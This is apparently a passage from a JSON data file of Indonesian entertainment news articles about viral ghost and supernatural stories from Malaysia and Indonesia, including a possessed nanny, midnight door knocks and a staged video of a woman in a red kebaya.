ujar pria tersebut.\nCerita ini awalnya ditulis oleh sang petugas di forum Reddit.\nKetika diunggah ulang oleh akun @TerrifyingPixs di Twitter, kisahnya mencuri banyak perhatian.\nPostingan yang diunggah Kamis lalu, 20 Juni 2019 itu hingga kini telah di-retweet sebanyak lebih dari 8.000 kali.\nSementara videonya telah disaksikan lebih dari 650 ribu kali.\nBerikut video yang diklaim kejadian nyata. Bagaimana menurut Sahabat Dream?\n\n“ I do security at a hospital. The chair was on the other side of the hallway on my first patrol, and on my second patrol this is what I found. This is really the only time I’ve ever experienced anything spooky like this.” From Reddit pic.twitter.com/38a9H14WGb\r\n— Terrifying (@TerrifyingPixs) 20 Juni 2019"
}, {
    "judul": "Misteri Ketukan Tanpa Salam Tengah Malam, Pria Ini Menduga Amalan Ilmu Hitam",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2020/12/18/155410/664xauto-misteri-ketukan-tanpa-salam-tengah-malam-pria-ini-menduga-amalan-ilmu-hitam-2012189.jpg",
    "desc": "\nMisteri ketukan 7 kali tanpa salam di tengah malam meneror warga.\nDream - Belakangan ini warga Malaysia digemparkan dengan ketukan pintu tanpa salam di tengah malam yang hingga kini masih menjadi misteri.\nInsiden tersebut awalnya dilaporkan hanya terjadi di Sabak Bernam, Selangor. Namun kini dilaporkan sudah merebak ke beberapa negara bagian, dan yang terbaru di Pahang.\nTidak hanya ketukan pintu tanpa salam sebanyak 7 kali, tapi ada juga yang mengaku pernah melihat makhluk halus menakutkan seperti pocong.\n\n",
    "story": "Amir Syamsul Rijal melalui postingan di Facebook miliknya membagikan pengalamannya sendiri. Amir yakin misteri itu terjadi karena adanya gangguan jin.\nKatanya, gangguan ini terjadi disebabkan tempat kediaman orang yang mendapat gangguan kemungkinan berada di perkampungan jin. Gangguan ketukan pintu itu biasanya terjadi pada tidak lebih dari tiga rumah yang berdekatan.\nAmir juga membagikan satu kejadian di Muar, Johor yang dia alami sendiri ketika sebuah rumah milik seorang kakek tiba-tiba diketuk pada tengah malam.Ketika kakek itu membuka pintu rumahnya, muncul makhluk kenit atau makhluk kerdil yang membawa kendi terbuat dari emas di hadapannya.\nLebih menyeramkan, katanya, makhluk itu seperti berbicara meminta air kepada kakek pemilik rumah karena persediaan air di tempatnya kering.\n\" Setelah kakek itu mengisi air di dalam kendi emas, makhluk kenit itu langsung lari menghilangkan ke dalam hutan di depan rumah kakek tersebut,\"  ceritanya.Amir mengatakan gangguan makhluk halus itu mungkin juga disebabkan oleh perbuatan seseorang yang gagal dalam menguasai ilmu hitam.\n\" Jika dilihat dari kejadiannya, gangguan ini lebih dari tiga kali, dan biasanya hingga 40 kali. Gangguan ini tidak berlaku di satu kawasan saja tapi ke negeri lain.\n\" Ini kemungkinan sebagai akibat seseorang tidak bisa mencukupi syarat dalam melengkapi ilmu hitam yang sedang dipelajarinya,\"  kata Amir.\nMenurut Amir, jika ada rumah yang menerima gangguan ketukan pintu tanpa salam, penghuni rumah bisa terkena dampak ilmu hitam tersebut.Untuk menghindari gangguan makhluk halus, Amir menyarankan pemilik rumah untuk membaca Al-Fatihah (sekali), Sholawat (3 kali), Ayat Kursi (7 kali).\nSetelah membaca ayat-ayat tersebut, hembuskan pada tapak tangan dan ketuk pintu rumah sebanyak tujuh kali. Amir mengatakan amalan ini sebaiknya diamalkan setiap malam.\n\" Bagaimanapun, sebagai umat Islam, kita perlu percaya setiap kejadian di dunia ini atas izin Allah. Kita hendaklah memohon perlindungan kepada Allah.\n\" Jangan sesekali menemui dukun yang mengamalkan ilmu yang bertentangan dengan ajaran Islam. Karena itu akan membawa kita kepada perbuatan syirik,\"  pungkas Amir.\nSumber: mStar.com.my"
}, {
    "judul": "Kisah Nyata Pengasuh Kesurupan, Menari Ronggeng Sambil Mainkan Bayi Majikan",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2020/10/01/148552/664xauto-kisah-nyata-pengasuh-kesurupan-menari-ronggeng-sambil-mainkan-bayi-majikan-201001g.jpg",
    "desc": "\nSely makin merinding dengar latar belakang pengasuh anak-anaknya itu.\nDream - Bagi ibu yang punya anak banyak, tentu sangat repot jika mengurusnya sendirian. Apalagi jika sang suami kerja d luar kota dan pulangnya seminggu atau sebulan sekali.\nKarena itu banyak ibu-ibu seperti ini yang merekrut pengasuh untuk menemani sekaligus menjaga anak-anak mereka.\nSeorang ibu muda bernama Sely Sulfi membagikan kisah horor seorang pengasuh bayi yang dia rekrut melalui pembantu rumah tangga ibunya.\nPengasuh itu namanya Bi Ani, sementara pembantu yang merekrutnya bernama Bi Eli. Kata Sely, keduanya berasal dari desa yang sama.\n\" Waktu itu saya butuh pengasuh bayi karena karena kakaknya si kembar masih kecil (mereka cuma beda 11 bulan).\n\" Jadi karena keteteran merawat 3 bayi, saya terpaksa rekrut pengasuh bayi yang bisa menginap di rumah,\"  kata Sulfi mengawali kisahnya.\nSekadar info, suami Sely hanya pulang seminggu sekali karena dinas di luar kota. Meski tinggal di rumah orangtua, tapi mereka tak bisa membantu Sely karena faktor usia.\nJadi, di rumah orangtua Sely itu ada pembantu namanya Bi Eli. Wanita inilah yang mencarikan pengasuh bayi buat ketiga anak Sely.\nMenurut Sely, pengasuh anak-anaknya itu namanya Bi Ani. Dia satu desa dengan Bi Eli, hanya rumahnya berjauhan.\nBi Eli dapat Bi Ani juga dari seorang teman. Jadi meski satu desa, mereka tidak kenal satu sama lain.\n\n",
    "story": "Waktu pertama bertemu Bi Ani, Sely sebenarnya sudah memiliki perasaan tidak enak. Wanita ini sering terlihat bengong dan pandangan matanya kosong. Namun Sely mengabaikan perasaannya itu.\nSely pun membagi tempat tidurnya. Dia tidur dengan anak pertamanya yang masih minum ASI dan salah satu dari bayi kembarnya yang bungsu.\nSementara Bi Ani dia minta tidur dengan bayi kembarnya yang besar. Mereka semua tidur dalam satu kamar, hanya beda kasur.Oh ya, Bi Eli sebelumnya minta izin tidak masuk selama 4 hari. Saat Bi Eli absen ini, Bi Ani baru mulai bekerja di rumah orangtua Sely.\nNamun entah kenapa, setiap Maghrib tiba, bayi kembar Sely tiba-tiba rewel. Bi Ani pun berusaha menenangkan dengan menggendongnya.\nTapi bayi kembar Sely malah tambah keras menangisnya. Seolah-olah anak Sely tidak nyaman berada di gendongan Bi Ani.\nDi hari keempat Bi Eli masuk kerja lagi. Saat itulah Sely baru tahu cerita yang sebenarnya tentang Bi Ani. Cerita Bi Eli membuat bulu kuduk Sely merinding.\n\" Bun saya benar-benar minta maaf yaa.. Sebenarnya Bi Ani itu bermasalah. Saya baru dapat info dari tetangga saya. Ternyata dia sering kesurupan,\"  kata Sely menirukan ucapan Bi Eli.Tentu saja Sely terkejut mendengar kata-kata Bi Eli. Menurut Bi Eli, sebelum bekerja di Sely, Bi Ani pernah jadi pengasuh di rumah seorang dokter.\n\" Dia pernah kerja di desa sebelah, jadi pengasuh anak dokter. Orangtua anak ini sibuk jadi anaknya sering ditinggal berdua dengan Bi Ani,\"  ujar Bi Eli ke Sely.\nSely penasaran dengan nasib anak dokter tersebut. Dia juga mulai mengerti kenapa punya firasat tidak enak dengan Bi Ani.\nKata Bi Eli, saat mengasuh anak dokter tersebut, Bi Ani tiba-tiba kesurupan. Dia joget-joget ala ronggeng.\n\" Balita yang diasuhnya dimain-mainkan seperti golek (boneka). Karena balitanya nangis ketakutan, Bi Ani malah memukulinya,\"  kata Bi Eli.Sely pun merasa merinding mendengar cerita Bi Eli. \" Kenapa dia bisa sering kesurupan gitu?\"  tanya Sely ke Bi Eli.\nMenurut Bi Eli, ayahnya Bi Ani itu dalang di kampung pelosok desa. Dalang di pelosok desa itu banyak melakukan ritual mistis.\n\" Jadi dia (ayah Bi Ani) sering bertapa di gunung demi kesuksesan kariernya. Tapi karena ilmunya gak kesampean (gak kuat) akhirnya imbasnya ke diri sendiri dan anak-anaknya,\"  jelas Bi Eli.\nMendengar penjelasan tentang ayah Bi Ani, Sely semakin merinding dan ketakutan. Dia pun berniat untuk segera memberhentikan Bi Ani dari pekerjaannya.\nTapi ketika Sely memanggil Bi Ani untuk bicara, tiba-tiba saja pengasuh bayinya itu seperti gemetaran. Saat ditanya Sely, Bi Ani bilang sedang tidak enak badan.\n\" Ya udah Bi, sekarang istirahat aja di kamar. Kalo bibi mau izin pulang dulu juga gak papa kok,\"  kata Sely dengan sedikit ketakutan.Saat berjalan ke kamar, Bi Ani seperti bicara sendiri dan kejangnya makin menjadi. Bi Eli dengan sigap menuntunnya masuk kamar.\nBegitu masuk kamar, tingkah Bi Ani makin aneh. Dia tiba-tiba membuka bajunya. Karena risih, Bi Eli keluar dari kamar.\nDitunggu beberapa menit, Bi Ani belum keluar dari kamar. Karena curiga, Bi Eli mengintip ke dalam lewat lubang pintu.\nBetapa kagetnya Bi Eli. Ternyata Bi Ani sedang menari seperti ronggeng dalam keadaan tanpa busana sama sekali.\n\" Ayah kemudian memanggil seorang ustaz untuk meruqyah Bi Ani. Setelah diberi pakaian, Bi Ani diruqyah. Saat diruqyah, Bi Ani menjerit-jerit kesakitan,\"  kata Sely.Suasana cukup mencekam. Ustaz bilang bahwa ada jin jahat yang bersemayam di dalam tubuh Bi Ani. Jin ini selalu mengikuti Bi Ani ke mana pun pergi.\nSelesai diruqyah, Bi Ani diantar pulang oleh Bi Eli menggunakan angkot. Ternyata di dalam angkot Bi Ani kesurupan lagi hingga Bi Eli malu dibuatnya.\nSely pun langsung memberhentikan Bi Ani hari itu juga. Dia tetap bersyukur anak-anaknya tidak mengalami hal-hal menakutkan selama diasuh Bi Ani.\nTidak hanya kepada dirinya, Sely juga berpesan kepada ibu-ibu di luar sana agar lebih hati-hati jika ingin merekrut pengasuh bayi.\nSumber: TikTok"
}, {
    "judul": "Viral Cerita Tetangga Dengar Suara Misterius dari Apartemen yang 2 Tahun Kosong",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2020/10/21/150308/664xauto-viral-cerita-penghuni-dengar-suara-misterius-dari-apartemen-yang-2-tahun-kosong-201021g.jpg",
    "desc": "\nKisah yang bikin merinding ini masih jadi misteri hingga kini.\nDream - Kisah seram tinggal di apartemen yang sudah lama tak ditempati dibagikan oleh gadis Malaysia bernama Fatin Shafira melalui akun Twitter @ftnshfr.\nFatin mengawali kisahnya saat menerima keluhan dari tetangga kalau mereka mendengar suara berisik dari unit apartemen miliknya setiap tengah malam.\nKeluhan itu disampaikan oleh tetangga Fatin berkali-kali melalui aplikasi WhatsApp.\n\n",
    "story": "Menurut tetangganya, hampir setiap lewat tengah malam mereka mendengar suara TV dinyalakan keras-keras dari unit apartemen Fatin.\n\" Salam, aku adalah tetangga di unit apartemen. Mau tanya apa ada yang tinggal di unit tersebut?\n\" Karena ada orang menyalakan TV kencang-kencang setelah jam 12 malam selama beberapa hari ini.\n\" Mohon diperiksa unit apartemennya, (kenapa tidak memakai headphone saja.) Terima kasih karena sudah mengganggu,\"  tulis tetangga Fatin.Karena merasa penasaran, Fatin dan keluarganya mendatangi unit apartemen yang dibilang horor tersebut.\nNamun setelah memeriksa apartemennya, Fatin tidak menemukan hal yang aneh-aneh. Hanya ada ruangan kosong, yang penuh debu dan kotoran.\nSelain itu, aliran listriknya juga sudah dimatikan. Jadi tidak mungkin semuanya bisa menyala dengan sendirinya.Jadi, untuk sementara Fatin menyimpulkan kalau gangguan yang dialami oleh tetangga itu adalah ulah makhluk halus.\n\" Jadi kami datang ke apartemen dan tidak ada tanda-tanda orang pernah masuk, menggunakan apapun di dalam rumah.\n\" Tidak ada jejak kaki (rumahnya sangat berdebu), colokan listrik tidak ada yang digunakan. Kesimpulan: hantu. sekian,\"  tulis Fatin.Namun Fatin tidak hanya menerima keluhan TV menyala lewat tengah malam, tetangganya di apartemen tersebut juga mengalami gangguan lainnya.\nMereka pernah mendengar orang menyiram toilet dan mandi. Tapi saat diperiksa, kamar mandinya kering sama sekali.\nSelain itu, aliran listrik dan airnya juga sudah lama dimatikan, sehingga tidak mungkin bisa menyala kecuali ada orang yang tinggal.Pagi harinya, ketika Fatin sudah pulang ke rumahnya, dia mendapat pesan lagi dari tetangga yang sama.\nKatanya, tadi malam dia kembali mendengar suara TV dan kipas AC menyala. Sayangnya, Fatin tidak bisa menengok apartemennya karena ada PSBB.\nFatin kembali meyakinkan tetangganya bahwa dia sudah mengganti kunci, mematikan listrik, dan sebagainya. Dia menduga bunyi-bunyian aneh itu dari unit lain.\n\" Sudah ganti kunci, matikan listrik, dan sebagainya. Mungkin berasal dari unit lain? Jangan biarkan hidup diselubungi misteri,\"  sindir Fatin.Hingga saat ini belum terkuak dari mana suara-suara aneh pada tengah malam itu berasal. Yang pasti netizen ikut merinding mendengar cerita Fatin.\n\" Kisah ini memang membuatku merinding. Seperti pepatah lama bilang jika sebuah rumah dibiarkan kosong lebih dari 40 hari, 'makhluk lain' akan datang dan mendiaminya,\"  tulis akun @fahmy2009.\n\" Rumah kalau ditinggal lama harus baca Surah Al-Baqarah dan buat sholat hajat. Seluruh surat ya, Insya Allah 'benda' itu akan pergi tempat lain,\"  tulis akun @marshoulddie.\n\" Ada yang bilang kalau kita mendengar bunyi-bunyian aneh di luar rumah, sebenarnya rumah kita yang mendapat gangguan,\"  tulis akun @AmanysMos.\nSumber: Twitter"
}, {
    "judul": "Kisah Seram Seorang Wanita Usai Nonton Film Horor",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2018/03/28/80749/664xauto-kisah-seram-seorang-wanita-usai-nonton-film-horor-dari-turki-180328n.jpg",
    "desc": "\nFilm horor tersebut diangkat dari kisah nyata.\nDream - Biasanya, setelah menonton film horor, ceritanya akan terbawa ke dalam mimpi. Tidak itu saja, film tersebut juga akan membuat kita takut untuk pergi ke dapur atau ke kamar mandi.Tetapi tidak demikian dengan pengalaman pengguna Facebook, Shafeeca Izyan, setelah dia dan suaminya menonton serial film horor dari Turki berjudul Siccin.Menurut Shafeeca, suaminya mengalami demam selama empat hingga lima hari. Tapi setelah suaminya melakukan tes darah, hasilnya normal.Sementara Shafeeca sendiri mengaku mengalami masalah kesehatan, mulai dari susah tidur hingga rahimnya turun.Wanita Turki ini mengatakan cerita serial film horor Siccin sebenarnya tidak seram. Tapi ada satu hal yang membuat film ini sangat mengerikan.Penasaran mengapa Siccin begitu menakutkan hingga Shafeeca dan suaminya mengalami berbagai masalah yang tak bisa dijelaskan dengan akal?Simak kelanjutannya di halaman berikut ini.\n\n",
    "story": "Pernah mendengar tentang serial film horor dari negara Turki berjudul Siccin?\nBeberapa keanehan yang saya alami tanpa sadar setelah menyaksikan 3 seri Siccin di antaranya adalah susah tidur secara tiba-tiba. Saya juga mengalami batuk parah tanpa mengenal waktu.\nBatuk saya tambah menjadi setiap menjelang Maghrib. Saking kuatnya tekanan batuk tersebut, rahim saya sampai turun.\nSaya juga sering merasa mau muntah dan keluar buih putih dari mulut saya. Tidak itu saja. Suami saya mengalami demam selama 4-5 hari.\nAnehnya, saat melakukan tes darah, suami saya dibilang normal-normal saja.Sebenarnya cerita Siccin ini tidak seram. Cuma kesalahan saya yang terlalu bersemangat menonton film serial ini. Saya lupa bahwa dalam cerita film ini dibacakan mantera asli berdasarkan kisah nyata.\nMantera dalam cerita Siccin benar-benar dibacakan untuk memanggil setan dan jin. Siccin atau pengucapan dalam Bahasa Melayu 'Sijjin' memiliki arti kitab amalan buruk.\nJadi, Siccin ini adalah kitab yang mencatat semua amalan orang kafir dan syirik yang mempercayai hal-hal lain selain Allah SWT.\nSiccin itu juga merupakan nama tempat yang berada di lapisan bumi yang ketujuh. Tempat itu merupakan pangkalan iblis dan bala tentaranya.\nSementara menurut Ibnu Katsir, Siccin artinya tempat kembali dan tempatnya tinggal orang-orang buruk.\nCerita dalam serial film horor Siccin ini diangkat dari kisah nyata. Banyak dari mantera yang dibacakan dalam film Siccin ini adalah mantera asli untuk memanggil setan dan jin.(Sumber: Siakapkeli.my)"
}, {
    "judul": "Viral! Wanita Berkebaya Merah Berjalan di Tengah Malam",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2018/04/02/80938/664xauto-video-sosok-wanita-berkebaya-merah-berjalan-di-tengah-malam-1804024.jpg",
    "desc": "\nMisteri sosok wanita berkebaya merah di Jalanan....\nDream - Sosok wanita misterius berkebaya merah berjalan di tengah pekatnya malam. Kehadirannya banyak memancing rasa penasaran.\nWanita itu berjalan sendirian di pinggiran jalan di Malaysia. Kamera CCTV mobil tak sengaja merekam kejadian tersebut.\nAnehnya, setiap beberapa meter mobil itu jalan selalu bertemu dengan sosok itu.\nSiapa, dan apa yang wanita berkebaya merah itu lakukan menjadi perbincangan dan kontroversi para warganet.\nBanyak yang ketakutan dan mengira kalau itu adalah sosok hantu.\n \n\n\n",
    "story": "Video mengerikan itu pertama kali diunggah ke Facebook oleh akun Cempedak Cheese pada Rabu 28 Maret lalu.\nNamun Baru-baru ini terungkap, Ternyata video tersebut hasil settingan dari beberapa orang. Terlihat dari beredarnya chat whatsapp orang yang mengunggahnya.\nSekelompok orang sengaja menyiapkan video tersebut dengan 3-4 orang memakai kebaya. Tiga orang pertama disuruh berjalan di pinggir jalan dan yang terakhir ditengah.\nSatu orang menyiapkan kamera di mobil dan seolah-olah tak sengaja terekam.Saat video tersebut viral Kepala Kulim District Police melakukan investigasi.\nTerungkap jika video itu hanyalah sebuah rekayasa.\nTujuan utamanya untuk membodohi dan menakuti orang-orang yang melintas di situ.\nMereka beranggapan netizen mudah percaya soal cerita seperti itu.\nBerikut Videonya...\n\n Source: vidio.com"
}, {
    "judul": "Merasa Dipeluk dari Belakang Saat Subuh, Setelah Menoleh ke Belakang...",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2018/12/13/98293/664xauto-merasa-ada-yang-merangkul-dari-belakang-setelah-menoleh-ke-belakang-181213g.jpg",
    "desc": "\nSebelum peristiwa misterius itu, wanita tersebut tidak pernah percaya dengan hantu, paranormal atau kejadian gaib lainnya.\nDream - Seorang wanita yang tidak disebutkan namanya mengaku mengalami kejadian aneh saat tidur di rumah masa kecilnya.\nWanita itu merasa ayahnya, yang sudah meninggal beberapa tahun sebelumnya, datang dan merangkulnya dari belakang.\nSebelum peristiwa misterius itu, wanita tersebut tidak pernah percaya dengan hantu, paranormal, atau kejadian gaib lainnya.\nWanita itu bercerita bahwa ayahnya sudah meninggal di rumah tersebut pada sembilan tahun lalu.\nKarena sesuatu hal, wanita itu sekarang pulang dan tinggal di rumah masa kecilnya itu bersama suaminya.\nTapi, saat bangun subuh, dia mengalami kejadian yang sangat menakutkan. Dia merasakan kehadiran ayahnya yang sudah meninggal dunia.\nRupanya, kejadian aneh itu juga sering dialami oleh ibunya yang selama ini menempati rumah tersebut.\n\" Selama bertahun-tahun, ibuku sering bilang bahwa dia bisa merasakan kehadiran ayahku di rumah ini. Tapi aku mendengarkan saja cerita itu agar tidak menyinggung perasaannya,\"  tulisnya di situs Mumsnet.com.\n\" Ibu bilang bahwa dia sering merasa ada orang duduk di sebelahnya di tempat tidur,\"  tambahnya.\nWanita itu menganggap cerita ibunya wajar karena rasa kehilangan dan kesedihan yang mendalam ditinggal ayahnya.\nNamun, sejak mengalami sendiri peristiwa menakutkan itu, wanita tersebut mulai mempercayai cerita ibunya.\n\n",
    "story": "Subuh itu, wanita tersebut sudah bangun namun masih malas untuk beranjak dari tempat tidur.\nWanita itu bisa mendengar suaminya berdiri dan menggosok gigi di kamar mandi. Dia juga mendengar suaminya ke dapur untuk masak air.\n\" Jadi aku benar-benar sudah bangun tapi masih malas untuk berdiri,\"  kata wanita itu.\nTak lama kemudian, dia merasa suaminya balik ke tempat tidur dan melakukan sesuatu yang tidak biasa.\n\" Tidak biasanya suamiku kembali ke tempat tidur, memeluk dan menciumku sebelum berangkat bekerja.\n\" Tapi aku merasa ada orang merangkul dari belakang. Aku merasakan hawa panas di antara tulang belikatku. Saat itu aku masih bersikap tenang,\"  katanya.\nNamun, wanita itu mulai merasa ketakutan setelah mendengar pintu depan seperti dibuka orang. Dia yakin itu adalah suaminya yang akan berangkat kerja.\n\" Aku langsung merinding. Aku sangat ketakutan dan tidak berhenti menangis. Lantas, siapa yang merangkul dari belakang ini? Apa ini ayahku yang sudah meninggal?\"  ujar wanita itu.Kisah wanita itu langsung mendapat ratusan komentar dari netizen. Ada yang percaya bahwa wanita itu sleep paralysis atau sering disebut dengan istilah ketindihan.\nSleep paralysis adalah kondisi di mana seseorang tidak dapat bergerak untuk sementara ketika akan tidur atau bangun.\nTindihan ini menyebabkan orang bisa merasakan atau melihat sesuatu yang lain di dalam ruangan.\nPadahal dalam dunia medis, tindihan ini terjadi di saat mekanisme otak dan tubuh tidak sinkron. Sehingga menyebabkan kita tersentak bangun di tengah siklus REM (rapid eye movement).\nSaat seseorang terbangun sebelum siklus REM benar-benar selesai, otak belum siap untuk mengirimkan sinyal bangun. Akibatnya, tubuh seakan masih dalam keadaan bermimpi, alias setengah tidur setengah sadar.\nSumber: Mirror.co.uk"
}, {
    "judul": "Kisah Nyata Pengasuh Kesurupan, Menari Ronggeng Sambil Mainkan Bayi Majikan",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2020/10/01/148552/664xauto-kisah-nyata-pengasuh-kesurupan-menari-ronggeng-sambil-mainkan-bayi-majikan-201001g.jpg",
    "desc": "\nSely makin merinding dengar latar belakang pengasuh anak-anaknya itu.\nDream - Bagi ibu yang punya anak banyak, tentu sangat repot jika mengurusnya sendirian. Apalagi jika sang suami kerja d luar kota dan pulangnya seminggu atau sebulan sekali.\nKarena itu banyak ibu-ibu seperti ini yang merekrut pengasuh untuk menemani sekaligus menjaga anak-anak mereka.\nSeorang ibu muda bernama Sely Sulfi membagikan kisah horor seorang pengasuh bayi yang dia rekrut melalui pembantu rumah tangga ibunya.\nPengasuh itu namanya Bi Ani, sementara pembantu yang merekrutnya bernama Bi Eli. Kata Sely, keduanya berasal dari desa yang sama.\n\" Waktu itu saya butuh pengasuh bayi karena karena kakaknya si kembar masih kecil (mereka cuma beda 11 bulan).\n\" Jadi karena keteteran merawat 3 bayi, saya terpaksa rekrut pengasuh bayi yang bisa menginap di rumah,\"  kata Sulfi mengawali kisahnya.\nSekadar info, suami Sely hanya pulang seminggu sekali karena dinas di luar kota. Meski tinggal di rumah orangtua, tapi mereka tak bisa membantu Sely karena faktor usia.\nJadi, di rumah orangtua Sely itu ada pembantu namanya Bi Eli. Wanita inilah yang mencarikan pengasuh bayi buat ketiga anak Sely.\nMenurut Sely, pengasuh anak-anaknya itu namanya Bi Ani. Dia satu desa dengan Bi Eli, hanya rumahnya berjauhan.\nBi Eli dapat Bi Ani juga dari seorang teman. Jadi meski satu desa, mereka tidak kenal satu sama lain.\n\n",
    "story": "Waktu pertama bertemu Bi Ani, Sely sebenarnya sudah memiliki perasaan tidak enak. Wanita ini sering terlihat bengong dan pandangan matanya kosong. Namun Sely mengabaikan perasaannya itu.\nSely pun membagi tempat tidurnya. Dia tidur dengan anak pertamanya yang masih minum ASI dan salah satu dari bayi kembarnya yang bungsu.\nSementara Bi Ani dia minta tidur dengan bayi kembarnya yang besar. Mereka semua tidur dalam satu kamar, hanya beda kasur.Oh ya, Bi Eli sebelumnya minta izin tidak masuk selama 4 hari. Saat Bi Eli absen ini, Bi Ani baru mulai bekerja di rumah orangtua Sely.\nNamun entah kenapa, setiap Maghrib tiba, bayi kembar Sely tiba-tiba rewel. Bi Ani pun berusaha menenangkan dengan menggendongnya.\nTapi bayi kembar Sely malah tambah keras menangisnya. Seolah-olah anak Sely tidak nyaman berada di gendongan Bi Ani.\nDi hari keempat Bi Eli masuk kerja lagi. Saat itulah Sely baru tahu cerita yang sebenarnya tentang Bi Ani. Cerita Bi Eli membuat bulu kuduk Sely merinding.\n\" Bun saya benar-benar minta maaf yaa.. Sebenarnya Bi Ani itu bermasalah. Saya baru dapat info dari tetangga saya. Ternyata dia sering kesurupan,\"  kata Sely menirukan ucapan Bi Eli.Tentu saja Sely terkejut mendengar kata-kata Bi Eli. Menurut Bi Eli, sebelum bekerja di Sely, Bi Ani pernah jadi pengasuh di rumah seorang dokter.\n\" Dia pernah kerja di desa sebelah, jadi pengasuh anak dokter. Orangtua anak ini sibuk jadi anaknya sering ditinggal berdua dengan Bi Ani,\"  ujar Bi Eli ke Sely.\nSely penasaran dengan nasib anak dokter tersebut. Dia juga mulai mengerti kenapa punya firasat tidak enak dengan Bi Ani.\nKata Bi Eli, saat mengasuh anak dokter tersebut, Bi Ani tiba-tiba kesurupan. Dia joget-joget ala ronggeng.\n\" Balita yang diasuhnya dimain-mainkan seperti golek (boneka). Karena balitanya nangis ketakutan, Bi Ani malah memukulinya,\"  kata Bi Eli.Sely pun merasa merinding mendengar cerita Bi Eli. \" Kenapa dia bisa sering kesurupan gitu?\"  tanya Sely ke Bi Eli.\nMenurut Bi Eli, ayahnya Bi Ani itu dalang di kampung pelosok desa. Dalang di pelosok desa itu banyak melakukan ritual mistis.\n\" Jadi dia (ayah Bi Ani) sering bertapa di gunung demi kesuksesan kariernya. Tapi karena ilmunya gak kesampean (gak kuat) akhirnya imbasnya ke diri sendiri dan anak-anaknya,\"  jelas Bi Eli.\nMendengar penjelasan tentang ayah Bi Ani, Sely semakin merinding dan ketakutan. Dia pun berniat untuk segera memberhentikan Bi Ani dari pekerjaannya.\nTapi ketika Sely memanggil Bi Ani untuk bicara, tiba-tiba saja pengasuh bayinya itu seperti gemetaran. Saat ditanya Sely, Bi Ani bilang sedang tidak enak badan.\n\" Ya udah Bi, sekarang istirahat aja di kamar. Kalo bibi mau izin pulang dulu juga gak papa kok,\"  kata Sely dengan sedikit ketakutan.Saat berjalan ke kamar, Bi Ani seperti bicara sendiri dan kejangnya makin menjadi. Bi Eli dengan sigap menuntunnya masuk kamar.\nBegitu masuk kamar, tingkah Bi Ani makin aneh. Dia tiba-tiba membuka bajunya. Karena risih, Bi Eli keluar dari kamar.\nDitunggu beberapa menit, Bi Ani belum keluar dari kamar. Karena curiga, Bi Eli mengintip ke dalam lewat lubang pintu.\nBetapa kagetnya Bi Eli. Ternyata Bi Ani sedang menari seperti ronggeng dalam keadaan tanpa busana sama sekali.\n\" Ayah kemudian memanggil seorang ustaz untuk meruqyah Bi Ani. Setelah diberi pakaian, Bi Ani diruqyah. Saat diruqyah, Bi Ani menjerit-jerit kesakitan,\"  kata Sely.Suasana cukup mencekam. Ustaz bilang bahwa ada jin jahat yang bersemayam di dalam tubuh Bi Ani. Jin ini selalu mengikuti Bi Ani ke mana pun pergi.\nSelesai diruqyah, Bi Ani diantar pulang oleh Bi Eli menggunakan angkot. Ternyata di dalam angkot Bi Ani kesurupan lagi hingga Bi Eli malu dibuatnya.\nSely pun langsung memberhentikan Bi Ani hari itu juga. Dia tetap bersyukur anak-anaknya tidak mengalami hal-hal menakutkan selama diasuh Bi Ani.\nTidak hanya kepada dirinya, Sely juga berpesan kepada ibu-ibu di luar sana agar lebih hati-hati jika ingin merekrut pengasuh bayi.\nSumber: TikTok"
}, {
    "judul": "Cerita Liburan Seram, Diganggu Bunyi-bunyi Misterius Sepanjang Malam",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2021/01/21/158119/664xauto-cerita-liburan-seram-diganggu-bunyi-bunyi-misterius-sepanjang-malam-210121z.jpg",
    "desc": "\nGangguan makhluk halus itu datang silih berganti.\nDream - Kita bukan satu-satunya penghuni dunia ini. Ada juga makhluk lain yang menemani, hanya saja kita tidak menyadarinya.\nSebagai Muslim, kita harus percaya pada hal gaib karena itu adalah bagian dari rukun iman. Namun, hanya kepada Allah kita pantas takut karena Dia yang mengendalikan segalanya.\nBaru-baru ini, seorang wanita Malaysia berbagi pengalaman menyeramkan saat berlibur di sebuah resort ternama di Malaysia.\nMelalui grup Facebook Kelab Cerita Hantu Malaysia, Siti Nazurah Abd Moin mengawali kisahnya ketika dia dan keluarga memutuskan menyewa sebuah homestay.\n\n",
    "story": "Rumah tersebut memiliki 3 kamar tidur. Tapi seperti biasanya, semuanya berukuran besar. Masing-masing memiliki 2 ranjang besar dan kamar mandi di dalam.\nKarena keluarga yang ikut hanya 5 orang termasuk dirinya, hanya kamar pertama yang terpakai. Sementara kamar 2 dan 3 dibiarkan tetap kosong.\nMalam itu, sekitar jam 9, Siti menyuruh ketiga anaknya tidur terlebih dahulu karena besok mereka bangun pagi-pagi melanjutkan perjalanan.\nSementara anak-anak tidur, Siti beres-beres dapur dan meja makan. Sebelumnya dia memang memasak dan makan malam bersama dengan keluarganya.Mungkin karena kelelahan, anak pertama dan kedua langsung tertidur. Sedangkan anak bungsunya keluar kamar, dan bilang ada hantu sambil tertawa.\nSiti awalnya tidak ambil pusing dengan ucapan anaknya itu karena dikenal suka bercanda dan sedikit hiperaktif.\nSekitar jam 11.30 malam, Siti masuk kamar, diikuti oleh anak bungsunya. Siti, suami, dan anak bungsunya tidur di satu ranjang. Sementara dua anaknya yang lain tidur di ranjang satunya.\nTak lama kemudian, si bungsu sudah tertidur. Tinggal Siti yang dari tadi masih belum bisa memejamkan mata.\nSaat berusaha tidur itulah, Siti tiba-tiba mendengar suara kursi di luar kamar diseret ke sana sini.\nBunyi suara kursi diseret tersebut sangat jelas. Suasana jadi sepi dan seram. Apalagi di luar hujan rintik-rintik.Awalnya Siti menganggap itu hanya perasaan saja karena seharian ini dia merasa lelah. Dia pun berusaha memejamkan mata.\nTapi itulah permulaan malam yang seram dan panjang, yang baru kali ini dialami sendiri oleh Siti.\n\" Suara menyeret kursi tersebut semakin keras, seperti orang memindahkan perabot. Untungnya, suami ada di sebelah, jadi rasa takut bisa sedikit terkontrol.\n\" Saya memaksakan diri untuk tidur begitu mendengar seperti ada orang bermain di pasir. Kali ini suaranya terdengar tepat di langit-langit di atas kepala tempat tidur kami,\"  kata 